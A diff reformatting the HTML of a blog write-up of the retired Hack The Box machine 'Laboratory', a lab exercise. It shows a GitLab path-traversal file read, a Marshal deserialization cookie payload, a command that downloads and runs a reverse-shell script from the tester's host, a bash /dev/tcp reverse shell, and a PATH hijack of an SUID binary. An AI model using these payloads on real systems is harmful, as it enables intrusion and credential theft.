@@ -1,167 +1,121 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Laboratory publish on November 14, 2020 by 0xc45. This box is rated as an easy box. It implies mostly gitlab and a LFI vulnerability and an SUID binary." />
-<meta name="keywords" content="security, boot2root, HTB, linux, gitlab">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Laboratory"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Laboratory publish on November 14, 2020 by 0xc45. This box is rated as an easy box. It implies mostly gitlab and a LFI vulnerability and an SUID binary."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2021/05/htb-laboratory.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2021-05-16 09:40:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="linux"/>
-  <meta property="article:tag" content="gitlab"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Laboratory</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Laboratory publish on November 14, 2020 by 0xc45. This box is rated as an easy box. It implies mostly gitlab and a LFI vulnerability and an SUID binary." name="description"/>
+<meta content="security, boot2root, HTB, linux, gitlab" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Laboratory" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Laboratory publish on November 14, 2020 by 0xc45. This box is rated as an easy box. It implies mostly gitlab and a LFI vulnerability and an SUID binary." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2021/05/htb-laboratory.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2021-05-16 09:40:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="linux" property="article:tag"/>
+<meta content="gitlab" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Laboratory</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-laboratory">HTB: Laboratory</h1>
-    <p>
+<header>
+<h1 id="htb-laboratory">HTB: Laboratory</h1>
+<p>
       Posted on 16 May 2021 in <a href="../../category/security.html">security</a>
 
-        &#8226; 5 min read
+        • 5 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2021.05/laboratory_card.png" alt="Laboratory Card" width="262"></p>
+</header>
+<div>
+<p><img alt="Laboratory Card" class="align-left" src="/media/2021.05/laboratory_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/298">Laboratory</a> publish on
 November 14, 2020 by
 <a href="https://www.hackthebox.com/home/users/profile/73268">0xc45</a>.
 This box is rated as an easy box. It implies mostly gitlab and a LFI
 vulnerability and an SUID binary.</p>
-
-
 <h1>Foothold</h1>
 <h2>Recon</h2>
 <p>Let us start as always by a <code>nmap</code> scan. Only port 22 (SSH), 80 and 443 (HTTP
@@ -179,13 +133,12 @@ Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Nov 26 09:51:28 2020 -- 1 IP address (1 host up) scanned in 120.73 seconds
 </code></pre></div>
-
 <h2>Web</h2>
 <p>The website either access with on the port 80 or 443 redirected to <code>https://laboratory.htb</code>.
 So we add an entry to <code>/etc/hosts</code>.
 We trying to access it again we got a certificate error as its supposed to be
 for <code>git.laboratory.htb</code></p>
-<p><img alt="ssl certificat" src="/media/2021.05/laboratory_01.png"></p>
+<p><img alt="ssl certificat" class="image-process-article-image" src="/media/2021.05/derivatives/article-image/laboratory_01.png"/></p>
 <p>Se we add another entry to our <code>/etc/hosts</code> and browse to it.</p>
 <h2>gitlab</h2>
 <p>This is a standard gitlab installation. We create an account and using the
@@ -202,7 +155,6 @@ we create two projects, one with an issue description containing the following
 link and we move it to the second project.</p>
 <div class="highlight"><pre><span></span><code>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)
 </code></pre></div>
-
 <p>That allow us to get the file content.</p>
 <div class="highlight"><pre><span></span><code># This file is managed by gitlab-ctl. Manual changes will be
 # erased! To change the contents below, edit /etc/gitlab/gitlab.rb
@@ -218,38 +170,36 @@ production:
     MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu
     &lt;SNIP&gt;
 </code></pre></div>
-
 <p>We need a gitlabshell to create the cookie that will allow use to execute the
 code on the box. We also need the same version as the one on the box.</p>
 <p>Using docker and some <a href="[https://www.howtoforge.com/how-to-install-gitlab-with-docker-on-ubuntu-2004">article</a>
 we create a <code>docker-compose.yml</code> that looks as follow.</p>
 <div class="highlight"><pre><span></span><code>web:
-  image: &#39;gitlab/gitlab-ce:12.8.1-ce.0&#39;
+  image: 'gitlab/gitlab-ce:12.8.1-ce.0'
   restart: always
-  hostname: &#39;gitlab.hakase-labs.io&#39;
+  hostname: 'gitlab.hakase-labs.io'
 
   environment:
     GITLAB_OMNIBUS_CONFIG: |
       # Add any other gitlab.rb configuration here, each on its own line
-      #external_url &#39;https://gitlab.hakase-labs.io&#39;
-      gitlab_rails[&#39;gitlab_shell_ssh_port&#39;] = 2224
-      #nginx[&#39;redirect_http_to_https&#39;] = true
-      #nginx[&#39;ssl_certificate&#39;] = &quot;/etc/gitlab/ssl/fullchain.pem&quot;
-      #nginx[&#39;ssl_certificate_key&#39;] = &quot;/etc/gitlab/ssl/privkey.pem&quot;
-      #nginx[&#39;ssl_dhparam&#39;] = &quot;/etc/gitlab/ssl/dhparams.pem&quot;
+      #external_url 'https://gitlab.hakase-labs.io'
+      gitlab_rails['gitlab_shell_ssh_port'] = 2224
+      #nginx['redirect_http_to_https'] = true
+      #nginx['ssl_certificate'] = "/etc/gitlab/ssl/fullchain.pem"
+      #nginx['ssl_certificate_key'] = "/etc/gitlab/ssl/privkey.pem"
+      #nginx['ssl_dhparam'] = "/etc/gitlab/ssl/dhparams.pem"
 
   ports:
-    - &#39;80:80&#39;
-    - &#39;443:443&#39;
-    - &#39;2224:22&#39;
+    - '80:80'
+    - '443:443'
+    - '2224:22'
 
   volumes:
-    - &#39;${GITLAB_HOME}/config:/etc/gitlab&#39;
-    - &#39;${GITLAB_HOME}/logs:/var/log/gitlab&#39;
-    - &#39;${GITLAB_HOME}/data:/var/opt/gitlab&#39;
-    - &#39;${GITLAB_HOME}/config/ssl:/etc/gitlab/ssl&#39;
+    - '${GITLAB_HOME}/config:/etc/gitlab'
+    - '${GITLAB_HOME}/logs:/var/log/gitlab'
+    - '${GITLAB_HOME}/data:/var/opt/gitlab'
+    - '${GITLAB_HOME}/config/ssl:/etc/gitlab/ssl'
 </code></pre></div>
-
 <h3>RCE</h3>
 <p>We got a shell on out gitlab docker and overwrite
 <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code> with the downloaded one.
@@ -258,26 +208,23 @@ Then we use <code>gitlab-rails console</code> to reproduce the lines in the
 to create a Marshalled payload within a cookie. Our first payload is a simple
 <code>wget</code> targeting our own python server.</p>
 <div class="highlight"><pre><span></span><code>request = ActionDispatch::Request.new(Rails.application.env_config)
-request.env[&quot;action_dispatch.cookies_serializer&quot;] = :marshal
+request.env["action_dispatch.cookies_serializer"] = :marshal
 cookies = request.cookie_jar
-irb(main):014:0&gt; erb = ERB.new(&quot;&lt;%= `wget http://10.10.14.51:8000/p0wn` %&gt;&quot;)
-depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &quot;@result&quot;, ActiveSupport::Deprecation.new)
+irb(main):014:0&gt; erb = ERB.new("&lt;%= `wget http://10.10.14.51:8000/p0wn` %&gt;")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
 cookies.signed[:cookie] = depr
 puts cookies[:cookie]
 BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGB3Z2V0IGh0dHA6Ly8xMC4xMC4xNC41MTo4MDAwL3Awd25gICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--e58cf8e3ef8e1b016de9b83cac7627d48ec17c45
 </code></pre></div>
-
 <p>We then use <code>curl</code> to send our request and got a hit on our web server.</p>
-<div class="highlight"><pre><span></span><code>curl -vvv -k &#39;https://git.laboratory.htb/users/sign_in&#39; -b &quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGB3Z2V0IGh0dHA6Ly8xMC4xMC4xNC41MTo4MDAwL3Awd25gICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--e58cf8e3ef8e1b016de9b83cac7627d48ec17c45&quot;
+<div class="highlight"><pre><span></span><code>curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGB3Z2V0IGh0dHA6Ly8xMC4xMC4xNC41MTo4MDAwL3Awd25gICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--e58cf8e3ef8e1b016de9b83cac7627d48ec17c45"
 </code></pre></div>
-
 <p>We then change our payload to download a "reverse shell" and execute it:
 <code>curl http://10.10.14.51:8000/rev.sh -o /tmp/rev.sh &amp;&amp; chmod 777 rev.sh &amp;&amp; bash /tmp/rev.sh</code></p>
 <p>The content of rev.sh is the following:</p>
 <div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
 bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.51/4242 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
 </code></pre></div>
-
 <p>Our <code>netcat</code> listener quickly catch a reverse shell as git.</p>
 <h2>Getting user</h2>
 <p>Using gitlab-rails console on the HTB machine and gitlab documentation about
@@ -294,7 +241,6 @@ Loading production environment (Rails 6.0.2)
 Switch to inspect mode.
 Project.update_all(visibility_level: 20)
 </code></pre></div>
-
 <p>That allow us to discover a <code>securedocker</code> project from the <code>dexter</code> user
 containing a <a href="https://git.laboratory.htb/dexter/securedocker/-/blob/master/dexter/.ssh/id_rsa">SSH private key</a>.</p>
 <p>Using this key we can connect as <code>dexter</code> on the box and get the user flag.</p>
@@ -304,7 +250,6 @@ uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)
 dexter@laboratory:~$ cat user.txt
 a153ecab9310723fa79e5dc37487ef68
 </code></pre></div>
-
 <h1>Root</h1>
 <p>We start enumerating the box. We "quickly" found a suspect SUID binary
 <code>docker-security</code>.</p>
@@ -327,23 +272,21 @@ a153ecab9310723fa79e5dc37487ef68
 -rwsr-xr-x 1 root root 22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
 -rwsr-xr-x 1 root root 473576 May 29  2020 /usr/lib/openssh/ssh-keysign
 </code></pre></div>
-
 <p>We use <code>ltrace</code> to see what binaries are called by the SUID one. We identify
 that the binary use a relative path call to <code>chmod</code>.</p>
 <div class="highlight"><pre><span></span><code>dexter@laboratory:~$ ltrace docker-security
 setuid(0)                                                                                                                                        = -1
 setgid(0)                                                                                                                                        = -1
-system(&quot;chmod 700 /usr/bin/docker&quot;chmod: changing permissions of &#39;/usr/bin/docker&#39;: Operation not permitted
+system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
 &lt;... system resumed&gt; )                                                                                                                           = 256
-system(&quot;chmod 660 /var/run/docker.sock&quot;chmod: changing permissions of &#39;/var/run/docker.sock&#39;: Operation not permitted
+system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
 &lt;... system resumed&gt; )                                                                                                                           = 256
 +++ exited (status 0) +++
 </code></pre></div>
-
 <p>So we simply create a new "<code>chmod</code>" program and add it to our path to get a root
 shell and grab the flag</p>
 <div class="highlight"><pre><span></span><code>dexter@laboratory:/tmp/.plop$ echo /bin/bash &gt; chmod
@@ -355,66 +298,44 @@ dexter@laboratory:/tmp/.plop$ docker-security
 root@laboratory:/tmp/.plop# cat /root/root.txt
 1b08ba51a612057b8aca9940e57fce77
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>A really interesting box that allow us to play with a real vulnerability from a
 bug bounty report. Maybe more a medium than an easy box.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/linux.html">linux</a>
-      <a href="../../tag/gitlab.html">gitlab</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2021/05/htb-ready.html" title="HTB: Ready">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2021/05/htb-delivery.html" title="HTB: Delivery">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/linux.html">linux</a>
+<a href="../../tag/gitlab.html">gitlab</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2021/05/htb-ready.html" title="HTB: Ready">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2021/05/htb-delivery.html" title="HTB: Delivery">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -425,6 +346,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
